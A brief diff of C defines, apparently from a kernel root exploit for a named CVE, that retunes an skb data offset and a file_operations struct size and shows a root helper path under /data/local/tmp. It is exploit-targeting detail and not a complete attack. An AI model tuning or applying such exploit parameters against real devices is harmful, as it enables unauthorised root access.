@@ -20,7 +20,7 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
-#define SKB_DATA_DELTA (-0x1000LL)
+#define SKB_DATA_DELTA (-0xe80LL)
 #define KMALLOC_CACHE_TYPES 3
 #define KMALLOC_CGROUP_TYPE 2
 
@@ -167,7 +167,7 @@
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 
 /* Target BTF layouts (pahole over the extracted vmlinux.btf). */
-#define SIZEOF_FILE_OPERATIONS 0x110
+#define SIZEOF_FILE_OPERATIONS 0x108
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
 #define FOPS_READ_OFF 0x10
